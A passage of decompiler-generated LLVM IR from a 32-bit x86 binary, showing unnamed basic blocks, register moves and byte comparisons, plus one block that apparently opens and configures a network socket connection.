dec_label_pc_804f0d6.backedge:                    ; preds = %dec_label_pc_804f15c, %dec_label_pc_804f7a7, %dec_label_pc_804f56b, %dec_label_pc_804f14c, %dec_label_pc_804f7f0, %dec_label_pc_804f9f9, %dec_label_pc_804f6a9, %dec_label_pc_804f433, %dec_label_pc_804f722, %dec_label_pc_804f3ee, %dec_label_pc_804f375, %dec_label_pc_804f337, %dec_label_pc_804f2be, %dec_label_pc_804f280, %dec_label_pc_804f84c, %dec_label_pc_804f234, %dec_label_pc_804f965, %dec_label_pc_804f42b, %dec_label_pc_804f470, %dec_label_pc_804f360, %dec_label_pc_804f2a9, %dec_label_pc_804f271, %dec_label_pc_804faf0
  %v0_804f0d6 = load i32, i32* @edi, align 4
  %v1_804f0d6 = add i32 %v0_804f0d6, 12
  %v2_804f0d6 = inttoptr i32 %v1_804f0d6 to i32*
  %v3_804f0d6 = load i32, i32* %v2_804f0d6, align 4
  store i32 %v3_804f0d6, i32* %eax.global-to-local, align 4
  %v1_804f0d9 = icmp eq i32 %v3_804f0d6, 0
  br i1 %v1_804f0d9, label %dec_label_pc_804efdb, label %dec_label_pc_804f0d6.backedge.dec_label_pc_804f0e1_crit_edge

dec_label_pc_804f0d6.backedge.dec_label_pc_804f0e1_crit_edge: ; preds = %dec_label_pc_804f0d6.backedge
  %v1_804f0e4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f0e1

dec_label_pc_804fb0e:                             ; preds = %dec_label_pc_804f61b
  %v1_804fb0e = add i32 %v0_804f11f, 104
  %v2_804fb0e = inttoptr i32 %v1_804fb0e to i32*
  %v3_804fb0e = load i32, i32* %v2_804fb0e, align 4
  store i32 %v3_804fb0e, i32* %eax.global-to-local, align 4
  %v1_804fb12 = inttoptr i32 %v3_804fb0e to i32*
  store i32 104, i32* %v1_804fb12, align 4
  %v0_804f637.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f637

dec_label_pc_804fb1d:                             ; preds = %dec_label_pc_804f637
  store i32 %v0_804fb1d, i32* @eax, align 4
  %v0_804fb1f = call i32 @function_804d840()
  store i32 %v0_804fb1f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804efdb

dec_label_pc_804fb29:                             ; preds = %dec_label_pc_804f023
  %v0_804fb2c = load i32, i32* @edi, align 4
  %v1_804fb2c = add i32 %v0_804fb2c, 4
  %v2_804fb2c = inttoptr i32 %v1_804fb2c to i32*
  %v3_804fb2c = load i32, i32* %v2_804fb2c, align 4
  store i32 %v3_804fb2c, i32* %eax.global-to-local, align 4
  %v2_804fb2f = add i32 %v0_804f059, 16
  %v3_804fb2f = inttoptr i32 %v2_804fb2f to i32*
  store i32 %v3_804fb2c, i32* %v3_804fb2f, align 4
  %v1_804fb30 = call i32 @function_8050f63(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804fb30, i32* %eax.global-to-local, align 4
  %v0_804fb38 = load i32, i32* @edi, align 4
  %v1_804fb38 = add i32 %v0_804fb38, 4
  %v2_804fb38 = inttoptr i32 %v1_804fb38 to i32*
  store i32 -1, i32* %v2_804fb38, align 4
  %v0_804fb3f = load i32, i32* @edi, align 4
  %v1_804fb3f = add i32 %v0_804fb3f, 284
  %v2_804fb3f = inttoptr i32 %v1_804fb3f to i8*
  store i8 0, i8* %v2_804fb3f, align 1
  %v0_804fb46 = load i32, i32* @edi, align 4
  %v1_804fb46 = add i32 %v0_804fb46, 12
  %v2_804fb46 = inttoptr i32 %v1_804fb46 to i32*
  store i32 0, i32* %v2_804fb46, align 4
  br label %dec_label_pc_804efdb

dec_label_pc_804fb52:                             ; preds = %dec_label_pc_804f609
  %v11_804fb52 = icmp eq i8 %v2_804f609, -5
  %v1_804fb54 = icmp eq i1 %v11_804fb52, false
  br i1 %v1_804fb54, label %dec_label_pc_804f195, label %dec_label_pc_804fb5a

dec_label_pc_804fb5a:                             ; preds = %dec_label_pc_804fb52
  store i8 -3, i8* %v1_804f609, align 1
  br label %dec_label_pc_804f195

dec_label_pc_804fb62:                             ; preds = %dec_label_pc_804f0a0, %dec_label_pc_804f069
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0b8

dec_label_pc_804fb69:                             ; preds = %dec_label_pc_804fa58
  %v1_804fb69 = add i32 %v0_804fa6f, 1
  %v8_804fb69 = icmp eq i32 %v1_804fb69, 0
  store i32 %v1_804fb69, i32* %eax.global-to-local, align 4
  br i1 %v8_804fb69, label %dec_label_pc_804fa7c, label %dec_label_pc_804fb70

dec_label_pc_804fb70:                             ; preds = %dec_label_pc_804fb69
  %v0_804fb70 = load i32, i32* @ecx, align 4
  %v1_804fb70 = load i32, i32* @esp, align 4
  %v2_804fb70 = add i32 %v1_804fb70, -4
  %v3_804fb70 = inttoptr i32 %v2_804fb70 to i32*
  store i32 %v0_804fb70, i32* %v3_804fb70, align 4
  %v1_804fb71 = add i32 %v1_804fb70, -8
  %v2_804fb71 = inttoptr i32 %v1_804fb71 to i32*
  store i32 0, i32* %v2_804fb71, align 4
  %v1_804fb73 = add i32 %v1_804fb70, -12
  %v2_804fb73 = inttoptr i32 %v1_804fb73 to i32*
  store i32 1, i32* %v2_804fb73, align 4
  %v1_804fb75 = add i32 %v1_804fb70, -16
  %v2_804fb75 = inttoptr i32 %v1_804fb75 to i32*
  store i32 2, i32* %v2_804fb75, align 4
  %v4_804fb77 = call i32 @function_8051747(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804fb77, i32* %eax.global-to-local, align 4
  %v0_804fb7c = load i32, i32* @esp, align 4
  %v1_804fb7c = inttoptr i32 %v0_804fb7c to i32*
  store i32 2, i32* %v1_804fb7c, align 4
  store i32 %v4_804fb77, i32* @ebx, align 4
  %v0_804fb85 = call i32 @function_8050470()
  store i32 %v0_804fb85, i32* %eax.global-to-local, align 4
  %v0_804fb8a = load i32, i32* @esp, align 4
  %v1_804fb8a = add i32 %v0_804fb8a, 1892
  %v2_804fb8a = inttoptr i32 %v1_804fb8a to i16*
  store i16 2, i16* %v2_804fb8a, align 2
  %v0_804fb94 = load i32, i32* @esp, align 4
  %v1_804fb94 = inttoptr i32 %v0_804fb94 to i32*
  store i32 ptrtoint ([15 x i8]* @global_var_8053842.26 to i32), i32* %v1_804fb94, align 4
  %v0_804fb9b = call i32 @function_805151c()
  store i32 %v0_804fb9b, i32* %eax.global-to-local, align 4
  %v1_804fba0 = load i32, i32* @esp, align 4
  %v2_804fba0 = add i32 %v1_804fba0, 1896
  %v3_804fba0 = inttoptr i32 %v2_804fba0 to i32*
  store i32 %v0_804fb9b, i32* %v3_804fba0, align 4
  %v0_804fba7 = load i32, i32* @esp, align 4
  %v1_804fba7 = inttoptr i32 %v0_804fba7 to i32*
  %v2_804fba7 = load i32, i32* %v1_804fba7, align 4
  store i32 %v2_804fba7, i32* %eax.global-to-local, align 4
  %v3_804fba7 = add i32 %v0_804fba7, 4
  %v1_804fba8 = inttoptr i32 %v3_804fba7 to i32*
  %v2_804fba8 = load i32, i32* %v1_804fba8, align 4
  store i32 %v2_804fba8, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804fba8, align 4
  store i32 2, i32* %v1_804fba7, align 4
  %v0_804fbad = call i32 @function_80503c0()
  %v1_804fbad = inttoptr i32 %v0_804fbad to i16*
  store i32 %v0_804fbad, i32* %eax.global-to-local, align 4
  %v3_804fbb2 = load i16, i16* %v1_804fbad, align 2
  %v4_804fbb2 = zext i16 %v3_804fbb2 to i32
  %v7_804fbb2 = and i32 %v0_804fbad, -65536
  %v8_804fbb2 = or i32 %v4_804fbb2, %v7_804fbb2
  store i32 %v8_804fbb2, i32* %eax.global-to-local, align 4
  %v0_804fbb5 = load i32, i32* @esp, align 4
  %v1_804fbb5 = inttoptr i32 %v0_804fbb5 to i32*
  store i32 2, i32* %v1_804fbb5, align 4
  %v0_804fbbc = load i32, i32* %eax.global-to-local, align 4
  %v1_804fbbc = trunc i32 %v0_804fbbc to i16
  %v2_804fbbc = load i32, i32* @esp, align 4
  %v3_804fbbc = add i32 %v2_804fbbc, 1894
  %v4_804fbbc = inttoptr i32 %v3_804fbbc to i16*
  store i16 %v1_804fbbc, i16* %v4_804fbbc, align 2
  %v0_804fbc4 = call i32 @function_80503f0()
  store i32 %v0_804fbc4, i32* %eax.global-to-local, align 4
  %v0_804fbc9 = load i32, i32* @esp, align 4
  %v1_804fbcc = add i32 %v0_804fbc9, 8
  %v2_804fbcc = inttoptr i32 %v1_804fbcc to i32*
  store i32 16, i32* %v2_804fbcc, align 4
  %v1_804fbce = add i32 %v0_804fbc9, 1892
  store i32 %v1_804fbce, i32* %ecx.global-to-local, align 4
  %v2_804fbd5 = add i32 %v0_804fbc9, 4
  %v3_804fbd5 = inttoptr i32 %v2_804fbd5 to i32*
  store i32 %v1_804fbce, i32* %v3_804fbd5, align 4
  %v0_804fbd6 = load i32, i32* @ebx, align 4
  %v3_804fbd6 = inttoptr i32 %v0_804fbc9 to i32*
  store i32 %v0_804fbd6, i32* %v3_804fbd6, align 4
  %v3_804fbd7 = call i32 @function_805156c(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804fbdc = load i32, i32* @esp, align 4
  %v1_804fbdf = add i32 %v3_804fbd7, 1
  %v8_804fbdf = icmp eq i32 %v1_804fbdf, 0
  store i32 %v1_804fbdf, i32* %eax.global-to-local, align 4
  %v1_804fbe0 = icmp eq i1 %v8_804fbdf, false
  br i1 %v1_804fbe0, label %dec_label_pc_804fbee, label %dec_label_pc_804fbe2

dec_label_pc_804fbe2:                             ; preds = %dec_label_pc_804fb70
  %v0_804fbe5 = load i32, i32* @ebx, align 4
  %v3_804fbe5 = inttoptr i32 %v0_804fbdc to i32*
  store i32 %v0_804fbe5, i32* %v3_804fbe5, align 4
  %v1_804fbe6 = call i32 @function_8050f63(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804fbe6, i32* %eax.global-to-local, align 4
  %v0_804fbeb = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fbee

dec_label_pc_804fbee:                             ; preds = %dec_label_pc_804fb70, %dec_label_pc_804fbe2
  %v0_804fbee.in = phi i32 [ %v0_804fbdc, %dec_label_pc_804fb70 ], [ %v0_804fbeb, %dec_label_pc_804fbe2 ]
  %v1_804fbee = add i32 %v0_804fbee.in, 1928
  %v2_804fbee = inttoptr i32 %v1_804fbee to i8*
  store i8 0, i8* %v2_804fbee, align 1
  %v0_804fbf6 = load i32, i32* @esp, align 4
  %v1_804fbf6 = add i32 %v0_804fbf6, -4
  %v2_804fbf6 = inttoptr i32 %v1_804fbf6 to i32*
  store i32 16384, i32* %v2_804fbf6, align 4
  %v1_804fbfb = add i32 %v0_804fbf6, -8
  %v2_804fbfb = inttoptr i32 %v1_804fbfb to i32*
  store i32 1, i32* %v2_804fbfb, align 4
  %v1_804fbfd = add i32 %v0_804fbf6, 1912
  store i32 %v1_804fbfd, i32* %eax.global-to-local, align 4
  %v2_804fc04 = add i32 %v0_804fbf6, -12
  %v3_804fc04 = inttoptr i32 %v2_804fc04 to i32*
  store i32 %v1_804fbfd, i32* %v3_804fc04, align 4
  %v0_804fc05 = load i32, i32* @ebx, align 4
  %v2_804fc05 = add i32 %v0_804fbf6, -16
  %v3_804fc05 = inttoptr i32 %v2_804fc05 to i32*
  store i32 %v0_804fc05, i32* %v3_804fc05, align 4
  %v0_804fc06 = call i32 @function_8051696()
  store i32 %v0_804fc06, i32* %eax.global-to-local, align 4
  %v0_804fc0b = load i32, i32* @esp, align 4
  %v1_804fc0b = add i32 %v0_804fc0b, -4
  %v2_804fc0b = inttoptr i32 %v1_804fc0b to i32*
  store i32 16384, i32* %v2_804fc0b, align 4
  %v1_804fc10 = add i32 %v0_804fc0b, -8
  %v2_804fc10 = inttoptr i32 %v1_804fc10 to i32*
  store i32 4, i32* %v2_804fc10, align 4
  %v1_804fc12 = add i32 %v0_804fc0b, 1936
  store i32 %v1_804fc12, i32* %edx.global-to-local, align 4
  %v2_804fc19 = add i32 %v0_804fc0b, -12
  %v3_804fc19 = inttoptr i32 %v2_804fc19 to i32*
  store i32 %v1_804fc12, i32* %v3_804fc19, align 4
  %v0_804fc1a = load i32, i32* @ebx, align 4
  %v2_804fc1a = add i32 %v0_804fc0b, -16
  %v3_804fc1a = inttoptr i32 %v2_804fc1a to i32*
  store i32 %v0_804fc1a, i32* %v3_804fc1a, align 4
  %v0_804fc1b = call i32 @function_8051696()
  store i32 %v0_804fc1b, i32* %eax.global-to-local, align 4
  %v0_804fc20 = load i32, i32* @esp, align 4
  %v1_804fc23 = add i32 %v0_804fc20, 28
  %v2_804fc23 = inttoptr i32 %v1_804fc23 to i32*
  store i32 16384, i32* %v2_804fc23, align 4
  %v1_804fc28 = add i32 %v0_804fc20, 24
  %v2_804fc28 = inttoptr i32 %v1_804fc28 to i32*
  store i32 2, i32* %v2_804fc28, align 4
  %v1_804fc2a = add i32 %v0_804fc20, 1962
  store i32 %v1_804fc2a, i32* %ecx.global-to-local, align 4
  %v2_804fc31 = add i32 %v0_804fc20, 20
  %v3_804fc31 = inttoptr i32 %v2_804fc31 to i32*
  store i32 %v1_804fc2a, i32* %v3_804fc31, align 4
  %v0_804fc32 = load i32, i32* @ebx, align 4
  %v2_804fc32 = add i32 %v0_804fc20, 16
  %v3_804fc32 = inttoptr i32 %v2_804fc32 to i32*
  store i32 %v0_804fc32, i32* %v3_804fc32, align 4
  %v0_804fc33 = call i32 @function_8051696()
  %v0_804fc38 = load i32, i32* @esi, align 4
  %v1_804fc38 = add i32 %v0_804fc38, 12
  store i32 %v1_804fc38, i32* %eax.global-to-local, align 4
  %v0_804fc3b = load i32, i32* @esp, align 4
  %v1_804fc3b = add i32 %v0_804fc3b, -4
  %v2_804fc3b = inttoptr i32 %v1_804fc3b to i32*
  store i32 16384, i32* %v2_804fc3b, align 4
  %v1_804fc40 = add i32 %v0_804fc3b, -8
  %v2_804fc40 = inttoptr i32 %v1_804fc40 to i32*
  store i32 1, i32* %v2_804fc40, align 4
  %v0_804fc42 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fc42 = add i32 %v0_804fc3b, -12
  %v3_804fc42 = inttoptr i32 %v2_804fc42 to i32*
  store i32 %v0_804fc42, i32* %v3_804fc42, align 4
  %v0_804fc43 = load i32, i32* @ebx, align 4
  %v2_804fc43 = add i32 %v0_804fc3b, -16
  %v3_804fc43 = inttoptr i32 %v2_804fc43 to i32*
  store i32 %v0_804fc43, i32* %v3_804fc43, align 4
  %v0_804fc44 = call i32 @function_8051696()
  %v0_804fc49 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804fc4e = add i32 %v0_804fc49, 28
  %v2_804fc4e = inttoptr i32 %v1_804fc4e to i32*
  store i32 16384, i32* %v2_804fc4e, align 4
  %v0_804fc53 = load i32, i32* @esi, align 4
  %v1_804fc53 = add i32 %v0_804fc53, 12
  %v2_804fc53 = inttoptr i32 %v1_804fc53 to i8*
  %v3_804fc53 = load i8, i8* %v2_804fc53, align 1
  %v4_804fc53 = zext i8 %v3_804fc53 to i32
  %v5_804fc53 = load i32, i32* %eax.global-to-local, align 4
  %v6_804fc53 = and i32 %v5_804fc53, -256
  %v7_804fc53 = or i32 %v6_804fc53, %v4_804fc53
  store i32 %v7_804fc53, i32* %eax.global-to-local, align 4
  %v2_804fc56 = add i32 %v0_804fc49, 24
  %v3_804fc56 = inttoptr i32 %v2_804fc56 to i32*
  store i32 %v7_804fc53, i32* %v3_804fc56, align 4
  %v0_804fc57 = load i32, i32* @esi, align 4
  %v1_804fc57 = inttoptr i32 %v0_804fc57 to i32*
  %v2_804fc57 = load i32, i32* %v1_804fc57, align 4
  store i32 %v2_804fc57, i32* %eax.global-to-local, align 4
  %v2_804fc59 = add i32 %v0_804fc49, 20
  %v3_804fc59 = inttoptr i32 %v2_804fc59 to i32*
  store i32 %v2_804fc57, i32* %v3_804fc59, align 4
  %v0_804fc5a = load i32, i32* @ebx, align 4
  %v2_804fc5a = add i32 %v0_804fc49, 16
  %v3_804fc5a = inttoptr i32 %v2_804fc5a to i32*
  store i32 %v0_804fc5a, i32* %v3_804fc5a, align 4
  %v0_804fc5b = call i32 @function_8051696()
  %v0_804fc60 = load i32, i32* @esi, align 4
  %v1_804fc60 = add i32 %v0_804fc60, 13
  store i32 %v1_804fc60, i32* %eax.global-to-local, align 4
  %v0_804fc63 = load i32, i32* @esp, align 4
  %v1_804fc63 = add i32 %v0_804fc63, -4
  %v2_804fc63 = inttoptr i32 %v1_804fc63 to i32*
  store i32 16384, i32* %v2_804fc63, align 4
  %v1_804fc68 = add i32 %v0_804fc63, -8
  %v2_804fc68 = inttoptr i32 %v1_804fc68 to i32*
  store i32 1, i32* %v2_804fc68, align 4
  %v0_804fc6a = load i32, i32* %eax.global-to-local, align 4
  %v2_804fc6a = add i32 %v0_804fc63, -12
  %v3_804fc6a = inttoptr i32 %v2_804fc6a to i32*
  store i32 %v0_804fc6a, i32* %v3_804fc6a, align 4
  %v0_804fc6b = load i32, i32* @ebx, align 4
  %v2_804fc6b = add i32 %v0_804fc63, -16
  %v3_804fc6b = inttoptr i32 %v2_804fc6b to i32*
  store i32 %v0_804fc6b, i32* %v3_804fc6b, align 4
  %v0_804fc6c = call i32 @function_8051696()
  %v0_804fc71 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804fc76 = add i32 %v0_804fc71, 28
  %v2_804fc76 = inttoptr i32 %v1_804fc76 to i32*
  store i32 16384, i32* %v2_804fc76, align 4
  %v0_804fc7b = load i32, i32* @esi, align 4
  %v1_804fc7b = add i32 %v0_804fc7b, 13
  %v2_804fc7b = inttoptr i32 %v1_804fc7b to i8*
  %v3_804fc7b = load i8, i8* %v2_804fc7b, align 1
  %v4_804fc7b = zext i8 %v3_804fc7b to i32
  %v5_804fc7b = load i32, i32* %eax.global-to-local, align 4
  %v6_804fc7b = and i32 %v5_804fc7b, -256
  %v7_804fc7b = or i32 %v6_804fc7b, %v4_804fc7b
  store i32 %v7_804fc7b, i32* %eax.global-to-local, align 4
  %v2_804fc7e = add i32 %v0_804fc71, 24
  %v3_804fc7e = inttoptr i32 %v2_804fc7e to i32*
  store i32 %v7_804fc7b, i32* %v3_804fc7e, align 4
  %v0_804fc7f = load i32, i32* @esi, align 4
  %v1_804fc7f = add i32 %v0_804fc7f, 4
  %v2_804fc7f = inttoptr i32 %v1_804fc7f to i32*
  %v3_804fc7f = load i32, i32* %v2_804fc7f, align 4
  store i32 %v3_804fc7f, i32* %eax.global-to-local, align 4
  %v2_804fc82 = add i32 %v0_804fc71, 20
  %v3_804fc82 = inttoptr i32 %v2_804fc82 to i32*
  store i32 %v3_804fc7f, i32* %v3_804fc82, align 4
  %v0_804fc83 = load i32, i32* @ebx, align 4
  %v2_804fc83 = add i32 %v0_804fc71, 16
  %v3_804fc83 = inttoptr i32 %v2_804fc83 to i32*
  store i32 %v0_804fc83, i32* %v3_804fc83, align 4
  %v0_804fc84 = call i32 @function_8051696()
  store i32 %v0_804fc84, i32* %eax.global-to-local, align 4
  %v0_804fc89 = load i32, i32* @ebx, align 4
  %v1_804fc89 = load i32, i32* @esp, align 4
  %v2_804fc89 = inttoptr i32 %v1_804fc89 to i32*
  store i32 %v0_804fc89, i32* %v2_804fc89, align 4
  %v1_804fc8c = call i32 @function_8050f63(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804fc8c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fa7c

dec_label_pc_804fc99:                             ; preds = %dec_label_pc_804ec21
  %v0_804fc99 = load i32, i32* @ebx, align 4
  %v1_804fc99 = trunc i32 %v0_804fc99 to i8
  %v10_804fc99 = icmp eq i8 %v1_804fc99, 46
  %v1_804fc9c = icmp eq i1 %v10_804fc99, false
  br i1 %v1_804fc9c, label %dec_label_pc_804ec33, label %dec_label_pc_804de41

dec_label_pc_804fca7:                             ; preds = %dec_label_pc_804ebf6
  %v0_804fca7 = load i32, i32* @ebx, align 4
  %v1_804fca7 = trunc i32 %v0_804fca7 to i8
  %v11_804fca7 = icmp eq i8 %v1_804fca7, -92
  %v1_804fcaa = icmp eq i1 %v11_804fca7, false
  br i1 %v1_804fcaa, label %dec_label_pc_804ec0f, label %dec_label_pc_804de41

dec_label_pc_804fcb5:                             ; preds = %dec_label_pc_804ebb9
  %v0_804fcb5 = load i32, i32* @ebx, align 4
  %v1_804fcb5 = trunc i32 %v0_804fcb5 to i8
  %tmp822 = icmp ugt i8 %v1_804fcb5, 96
  %v1_804fcb5.off = add i8 %v1_804fcb5, -97
  %tmp823 = icmp ult i8 %v1_804fcb5.off, 2
  %or.cond279 = and i1 %tmp822, %tmp823
  br i1 %or.cond279, label %dec_label_pc_804de41, label %dec_label_pc_804ebff.thread

dec_label_pc_804fccc:                             ; preds = %dec_label_pc_804ebff
  %v0_804fccc = load i32, i32* @ebx, align 4
  %v1_804fccc = trunc i32 %v0_804fccc to i8
  %tmp824 = icmp ult i8 %v1_804fccc, 108
  br i1 %tmp824, label %dec_label_pc_804de41, label %dec_label_pc_804ec0f

dec_label_pc_804fcda:                             ; preds = %dec_label_pc_804ebb9
  %v0_804fcda = load i32, i32* @ebx, align 4
  %v1_804fcda = trunc i32 %v0_804fcda to i8
  %tmp825 = icmp ugt i8 %v1_804fcda, -12
  %v11_804fce3 = icmp eq i8 %v1_804fcda, -1
  %v1_804fce6 = icmp eq i1 %v11_804fce3, false
  %or.cond280 = and i1 %tmp825, %v1_804fce6
  br i1 %or.cond280, label %dec_label_pc_804de41, label %dec_label_pc_804ebff.thread

dec_label_pc_804fcf1:                             ; preds = %dec_label_pc_804ebb9
  %v0_804fcf1 = load i32, i32* @ebx, align 4
  %v1_804fcf1 = trunc i32 %v0_804fcf1 to i8
  %v1_804fcf1.off = add i8 %v1_804fcf1, 74
  %tmp826 = icmp ult i8 %v1_804fcf1.off, 7
  br i1 %tmp826, label %dec_label_pc_804de41, label %dec_label_pc_804ebff.thread

dec_label_pc_804fd08:                             ; preds = %dec_label_pc_804eb92
  %v0_804fd08 = load i32, i32* @ebx, align 4
  %v1_804fd08 = trunc i32 %v0_804fd08 to i8
  %v1_804fd08.off = add i8 %v1_804fd08, -94
  %tmp827 = icmp ult i8 %v1_804fd08.off, 15
  br i1 %tmp827, label %dec_label_pc_804de41, label %dec_label_pc_804eba4

dec_label_pc_804fd1f:                             ; preds = %dec_label_pc_804eb92
  %v0_804fd1f = load i32, i32* @ebx, align 4
  %v1_804fd1f = trunc i32 %v0_804fd1f to i8
  %v1_804fd1f.off = add i8 %v1_804fd1f, 40
  %tmp828 = icmp ult i8 %v1_804fd1f.off, 15
  br i1 %tmp828, label %dec_label_pc_804de41, label %dec_label_pc_804eba4

dec_label_pc_804fd36:                             ; preds = %dec_label_pc_804eac3
  %v0_804fd36 = load i32, i32* @ebx, align 4
  %v1_804fd36 = trunc i32 %v0_804fd36 to i8
  %v1_804fd36.off = add i8 %v1_804fd36, 97
  %tmp829 = icmp ult i8 %v1_804fd36.off, 24
  br i1 %tmp829, label %dec_label_pc_804de41, label %dec_label_pc_804eacc

dec_label_pc_804fd64:                             ; preds = %dec_label_pc_804eb60, %dec_label_pc_804eb55
  %v10_804fd64 = icmp eq i8 %v1_804e955, 79
  %v1_804fd67 = icmp eq i1 %v10_804fd64, false
  br i1 %v1_804fd67, label %dec_label_pc_804eb72, label %dec_label_pc_804fd6d

dec_label_pc_804fd6d:                             ; preds = %dec_label_pc_804fd64
  %v0_804fd6d = load i32, i32* @ebx, align 4
  %v1_804fd6d = trunc i32 %v0_804fd6d to i8
  %v10_804fd6d = icmp eq i8 %v1_804fd6d, 121
  %tmp830 = and i1 %v7_8050011, %v10_804fd6d
  %or.cond287 = and i1 %v1_8050359, %tmp830
  br i1 %or.cond287, label %dec_label_pc_804de41, label %dec_label_pc_804eb72

dec_label_pc_804fd8c:                             ; preds = %dec_label_pc_804eb82
  %v8_804fd95 = icmp eq i8 %v4_804de51, 96
  br i1 %v8_804fd95, label %dec_label_pc_804de41, label %dec_label_pc_804eba4

dec_label_pc_804fda3:                             ; preds = %dec_label_pc_804eaa5
  %v0_804fda3 = load i32, i32* @ebx, align 4
  %v1_804fda3 = trunc i32 %v0_804fda3 to i8
  %v11_804fda3 = icmp eq i8 %v1_804fda3, -114
  %v4_804de51.off573 = add i8 %v4_804de51, 48
  %tmp831 = icmp ult i8 %v4_804de51.off573, 15
  %tmp832 = and i1 %tmp831, %v11_804fda3
  br i1 %tmp832, label %dec_label_pc_804de41, label %dec_label_pc_804eaae

dec_label_pc_804fdda:                             ; preds = %dec_label_pc_804ea6c
  %v0_804fdda = load i32, i32* @ebx, align 4
  %v1_804fdda = trunc i32 %v0_804fdda to i8
  %v11_804fdda = icmp eq i8 %v1_804fdda, -36
  %v4_804de51.off576 = add i8 %v4_804de51, 84
  %tmp833 = icmp ult i8 %v4_804de51.off576, 3
  %tmp834 = and i1 %tmp833, %v11_804fdda
  br i1 %tmp834, label %dec_label_pc_804de41, label %dec_label_pc_804ea75

dec_label_pc_804fe6d:                             ; preds = %dec_label_pc_804e287
  %v1_804e26b.off = add i8 %v1_804e26b, 79
  %tmp835 = icmp ult i8 %v1_804e26b.off, 46
  br i1 %tmp835, label %dec_label_pc_804de41, label %dec_label_pc_804e29f

dec_label_pc_804fe84:                             ; preds = %dec_label_pc_804e287
  %v3_804fe84 = trunc i32 %v7_804e28a to i8
  %v4_804fe84 = icmp ne i8 %v3_804fe84, 0
  %tmp836 = icmp ult i8 %v1_804e26b, -21
  %or.cond305 = and i1 %tmp836, %v4_804fe84
  br i1 %or.cond305, label %dec_label_pc_804de41, label %dec_label_pc_804e29f

dec_label_pc_804fe9a:                             ; preds = %dec_label_pc_804e26b
  %tmp837 = icmp ult i8 %v1_804e26b, -5
  %or.cond488 = and i1 %tmp837, %v4_804fe9a.not487
  br i1 %or.cond488, label %dec_label_pc_804de41, label %dec_label_pc_804e287.thread

dec_label_pc_804feb0:                             ; preds = %dec_label_pc_804e248
  %v0_804feb0 = load i32, i32* @ebx, align 4
  %v1_804feb0 = trunc i32 %v0_804feb0 to i8
  %v1_804feb0.off = add i8 %v1_804feb0, -40
  %tmp838 = icmp sgt i8 %v1_804feb0.off, -1
  br i1 %tmp838, label %dec_label_pc_804de41, label %dec_label_pc_804e26b

dec_label_pc_804fec7:                             ; preds = %dec_label_pc_804e248
  %v0_804fec7 = load i32, i32* @ebx, align 4
  %v1_804fec7 = trunc i32 %v0_804fec7 to i8
  %tmp839 = icmp ugt i8 %v1_804fec7, 21
  %v11_804fed0 = icmp eq i8 %v1_804fec7, -1
  %v1_804fed3 = icmp eq i1 %v11_804fed0, false
  %or.cond307 = and i1 %tmp839, %v1_804fed3
  br i1 %or.cond307, label %dec_label_pc_804de41, label %dec_label_pc_804e26b

dec_label_pc_804fede:                             ; preds = %dec_label_pc_804e248
  %v0_804fede = load i32, i32* @esp, align 4
  %v1_804fede = add i32 %v0_804fede, 53
  %v2_804fede = inttoptr i32 %v1_804fede to i8*
  %v3_804fede = load i8, i8* %v2_804fede, align 1
  %v4_804fede = icmp eq i8 %v3_804fede, 0
  br i1 %v4_804fede, label %dec_label_pc_804e26b, label %dec_label_pc_804fee9

dec_label_pc_804fee9:                             ; preds = %dec_label_pc_804fede
  %v0_804fee9 = load i32, i32* @ebx, align 4
  %v1_804fee9 = trunc i32 %v0_804fee9 to i8
  %tmp840 = icmp ult i8 %v1_804fee9, -19
  br i1 %tmp840, label %dec_label_pc_804de41, label %dec_label_pc_804e26b

dec_label_pc_804fef7:                             ; preds = %dec_label_pc_804e1e3
  %v1_804fef7 = add i32 %v0_804fef7, 57
  %v2_804fef7 = inttoptr i32 %v1_804fef7 to i8*
  %v3_804fef7 = load i8, i8* %v2_804fef7, align 1
  %v4_804fef7 = icmp eq i8 %v3_804fef7, 0
  br i1 %v4_804fef7, label %dec_label_pc_804e1f4, label %dec_label_pc_804ff02

dec_label_pc_804ff02:                             ; preds = %dec_label_pc_804fef7
  %v0_804ff02 = load i32, i32* @ebx, align 4
  %v1_804ff02 = trunc i32 %v0_804ff02 to i8
  %tmp841 = icmp ult i8 %v1_804ff02, 127
  br i1 %tmp841, label %dec_label_pc_804de41, label %dec_label_pc_804e1f4

dec_label_pc_804ff1e:                             ; preds = %dec_label_pc_804e107
  %v1_804ff1e = add i32 %v0_804ff1e, 66
  %v2_804ff1e = inttoptr i32 %v1_804ff1e to i8*
  %v3_804ff1e = load i8, i8* %v2_804ff1e, align 1
  %v4_804ff1e = icmp eq i8 %v3_804ff1e, 0
  %v1_804ff23 = icmp eq i1 %v4_804ff1e, false
  br i1 %v1_804ff23, label %dec_label_pc_804de41, label %dec_label_pc_804e118

dec_label_pc_804ff2e:                             ; preds = %dec_label_pc_804e0f6
  %v1_804ff2e = add i32 %v0_804ff2e, 67
  %v2_804ff2e = inttoptr i32 %v1_804ff2e to i8*
  %v3_804ff2e = load i8, i8* %v2_804ff2e, align 1
  %v4_804ff2e = icmp eq i8 %v3_804ff2e, 0
  %v1_804ff33 = icmp eq i1 %v4_804ff2e, false
  br i1 %v1_804ff33, label %dec_label_pc_804de41, label %dec_label_pc_804e107

dec_label_pc_804ff3e:                             ; preds = %dec_label_pc_804e098
  %v0_804ff3e = load i32, i32* @ebx, align 4
  %v1_804ff3e = trunc i32 %v0_804ff3e to i8
  %v10_804ff3e = icmp eq i8 %v1_804ff3e, 9
  %v1_804ff41 = icmp eq i1 %v10_804ff3e, false
